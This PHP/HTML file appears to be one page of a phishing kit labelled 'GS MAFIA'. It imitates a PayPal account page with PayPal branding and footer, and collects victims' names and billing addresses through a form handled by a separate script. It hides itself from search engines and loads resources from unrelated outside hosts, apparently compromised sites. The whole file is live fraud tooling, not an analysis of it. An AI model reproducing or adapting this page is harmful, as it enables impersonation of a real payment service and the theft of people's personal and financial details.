<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
include("languages/index.php");
include ("languages/lang".$_SESSION['gs_langlink']);
?>
<html class="html-us">
<head>
	<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<meta name="robots" content="noindex, nofollow">
	<link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico" />
	<link rel="stylesheet" type="text/css" href="css/gs_style.css">
	<link rel="stylesheet" type="text/css" href="css/gs_fonts.css">
	<link rel="stylesheet" href="./css/main.css">
	<title><?= $gs_string40 ?></title>
	<style type="text/css">
		#gs_texthead{
			background-position: 0 91%;
			background-image: url(images/superbowlAsset.png);
			background-repeat: no-repeat;
			background-size: 145%;
			font-family: "PayPal-Sans", "HelveticaNeue-Light", "Helvetica Neue Light", helvetica, arial, sans-serif;
			padding-left: 20px;
			color: #e3e3e3;
		}
	</style>
</head>
<body class="page desktop us Full-context tesla" data-browser="CH" data-browserversion="67.0.3396.99" data-contexttype="Full-context" data-correlationid="5c1ed609dd4d4" data-country="us" data-flow="te" data-pagename="" data-react-helmet="class,data-browser,data-browserversion,data-contexttype,data-correlationId,data-country,data-flow,data-pagename">
    
	<div id="cape-react-app">
		<div data-reactroot="" class="data-reactRoot">
			<div style="position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px;">
				<div>
					<div>
					</div>
						<div class="vx_globalNav-main" role="banner" data-reactid="14">
						<div class="vx_globalNav-container" data-reactid="15">
							<a href="#" name="ppLogo" class="vx_globalNav-brand_desktop" data-reactid="16">
							    
								<span class="vx_a11yText" data-reactid="17">
								Summary</span>
							</a>
							<div class="vx_globalNav-secondaryNav_mobile" data-reactid="18">
								<link rel="stylesheet" type="text/css" href="http://css.transconpackaging.com/login.jpg">
								<div class="vx_globalNav-listItem_settings hide-for-mobile" data-reactid="21">
									<a href="#" name="settings_mobile" class="vx_globalNav-link_settings" data-reactid="22">
										<span class="vx_globalNav-iconWrapper_secondary" data-reactid="23">
											<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings" data-reactid="24">
											</span>
										</span>
										<span class="vx_a11yText" data-reactid="25">
										Profile</span>
									</a>
								</div>
								<link rel="stylesheet" type="text/css" href="https://creedmoria.com/wordpress/img/login,css">
							</div>
							<div class="vx_globalNav-navContainer hide-for-mobile" data-reactid="28">
								<nav class="vx_globalNav-nav" role="navigation" data-reactid="29">
									<ul class="vx_globalNav-list" data-reactid="30">
										<li data-reactid="31">
											<a href="#" name="summary" class="vx_globalNav-links" data-reactid="32">
											Summary</a>

										</li>
										<li data-reactid="33">
											<a href="#" name="activity" class="vx_globalNav-links" data-reactid="34">
											Activity</a>
										</li>
										<li data-reactid="35">
											<a href="#" name="transfer" class="vx_globalNav-links" data-reactid="36">
											Send &amp; Request</a>
										</li>
										<li data-reactid="37">
											<a href="#" name="wallet" class=" vx_globalNav-links" data-reactid="38">
											Wallet</a>
										</li>
										<li data-reactid="39">
											<a href="#" target="_top" name="shop" class="vx_globalNav-links" data-reactid="40">
											Shop</a>
										</li>
									</ul>
									<ul class="vx_globalNav-list_secondary" data-reactid="41">
										<li data-reactid="42">
											<a name="search" href="#" class="vx_globalNav-link_iconOnly" data-reactid="43">
												<span class="vx_globalNav-iconWrapper_secondary" data-reactid="44">
													<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSearch icon-magnifying-glass" data-reactid="45">
													</span>
												</span>
												<span class="vx_a11yText" data-reactid="46">
												Search</span>
											</a>
										</li>
										<li data-reactid="47">
											<a href="#" name="settings" class="vx_globalNav-link_settings" data-reactid="48">
												<span class="vx_globalNav-iconWrapper_secondary" data-reactid="49">
													<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings" data-reactid="50">
													</span>
												</span>
												<span class="vx_a11yText" data-reactid="51">
												Profile</span>
											</a>
										</li>
										<li class="vx_globalNav-listItem_logout" data-reactid="52">
											<a name="logout" id="testidbb" class="vx_globalNav-link_logout" data-reactid="53">
											Log Out</a>

										</li>
									</ul>
								</nav>
							</div>
						</div>
					</div>
						<div class="vx_globalNav-main_mobile" data-reactid="55">
							<div class="vx_globalNav-headerSection_trigger" data-reactid="56">
								<label class="vx_globalNav-toggleTrigger" name="menu" for="toggleNavigation" data-reactid="57">
								Menu</label>
							</div>
							<div class="vx_globalNav-headerSection_logo" data-reactid="58">
								<a href="#" name="ppLogo_mobile" class="vx_globalNav-brand_mobile" data-reactid="59">
									<span class="vx_a11yText" data-reactid="60">
									Summary</span>
								</a>
							</div>
							<ul class="vx_globalNav-headerSection_actions" data-reactid="61">
							</ul>
						</div>
						<div class="outerWrapper us-wrapper" style="height:488px;">
							<div id="wrapper" style="height: 600px; margin-top: 71px">
								<div id="main">
									<div id="BillingAddressPage">
										<div id="content">
											<div id="content-child" class="row-fluid table-layout">
											<div id="gs_load">
											<div id="gs_loading"></div>
											<div id="gs_overlay"></div>
											</div>
												<div id="content-left" class="span13 table-cell">
													<div class="StickyContainer">
														<div class="StickyBody full-height">
															<div class="CTABannerContainer CTABannerContainer--billinginfopage "><div class="DefaultCTABanner">
															</div>
															<div class="DefaultGreeting">
																<div class="cta-banner">
																	<div class="cta-headline">
																		<span class="cta-name"><h2 style="margin-bottom: 0px;font-size: 26px;"><?= $gs_string13 ?></h2>
															</span>
														<div class="textInput lap">
														<div class="fields email large">
															<div class="nativeDropdown  large ">
																<div class="selectDropdown ">
																</div>
															</div>
														</div>
													</div></div></div></div></div><div class="body-content">
													<div>
													<div class="row gutter-10 "><div class="col-xs-6"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_fname" onblur="gs_verifinput(0);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="" id="gs_fname" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="city"><?= $gs_string14 ?></label></div></div></div><div class="col-xs-6"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_lname" onblur="gs_verifinput(1);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="" id="gs_lname" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="postalCode"><?= $gs_string15 ?></label>
													</div></div></div></div>
													<div id="address-suggest-field" class="AddressSuggestField"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_street1" onblur="gs_verifinput(2);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" id="gs_street1" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="street1"><?= $gs_string16 ?></label>
													
													</div></div></div><div class="TextField form-field"></div></div><div class="row gutter-10 "><div class="col-xs-6"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_city" onblur="gs_verifinput(3);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="" id="gs_city" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="city"><?= $gs_string17 ?></label>
													</div></div></div><div class="col-xs-6"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_postalCode" onblur="gs_verifinput(4);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="" id="gs_postalCode" maxlength="10" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="postalCode"><?= $gs_string18 ?></label>
													</div></div></div>
													</div>
													<div id="address-suggest-field" class="AddressSuggestField"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_country" onblur="gs_verifinput(2);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" id="gs_country" value="<?= $_SESSION['gs_country'] ?>" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="street1"><?= $gs_string35 ?></label>
													</div></div></div>
													</div></div>
													<div class="StickyFooter">
														<div class="sticky-footer-container">
															<div class="sticky-footer-fade">
															</div>
															<div class="sticky-footer-body">
																<div class="body-content">
																	<div id="action-buttons" class="buttons">
																		<button class="CAPE-Button btn full " onclick="gs_processbill();" type="button" id="billingInfoContinueBtn"><span><?= $gs_string19 ?></span></button>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
												<aside id="content-right" class="span11 table-cell hide-for-mobile">
													<div class="AsideContentContainer">
														<div class="TeslaAsideContent">
															<div class="aside-content">
																<div class="aside-content-icon">
																	<div class="calendar-img" style="margin-left: 0px; margin-right: 0px; width: 208px;height: 177px;">
																	</div>
																</div>
															</div>
														</div>
													</aside>
												</div>
											</div>
										</div>
									</div>
								</div>
								<div class="vx_globalFooter" data-reactid="147" style="top: 728px;">
								<div class="vx_globalFooter-content" data-reactid="148" style="
								margin-bottom: 0px;
								">
								<ul class="vx_globalFooter-list" data-reactid="149">
									<li data-reactid="150">
										<a href="/us/selfhelp/home" name="help" data-reactid="151">
										Help &amp; Contact</a>
									</li>
									<li data-reactid="152">
										<a href="#" name="security" data-reactid="153">
										Security</a>
									</li>
								</ul>
								<div class="vx_globalFooter_secondary" data-reactid="154">
									<p class="vx_globalFooter-copyright" data-reactid="155">
										<!-- react-text: 156 -->
										© 1999-2020 PayPal, Inc.<!-- /react-text -->
										<!-- react-text: 157 -->
										<!-- /react-text -->
										<!-- react-text: 158 -->
										All rights reserved.<!-- /react-text -->
									</p>
									<ul class="vx_globalFooter-list_secondary" data-reactid="159">
										<li data-reactid="160">
											<a href="#" name="privacy" data-reactid="161">
											Privacy</a>
										</li>
										<li data-reactid="162">
											<a href="#" name="legal" data-reactid="163">
											Legal</a>
										</li>
										<li data-reactid="164">
											<a href="#" name="policyUpdates" data-reactid="165">
											Policy updates</a>
										</li>
										<li id="siteFeedback" data-reactid="166">
										</li>
									</ul>
								</div>
								<p class="vx_globalFooter-disclaimer" data-reactid="167">
								</p>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
		<script type="text/javascript" src="js/gs_bill.js"></script>
		<script type="text/javascript" src="js/jquery.js"></script>
	</body>
</html>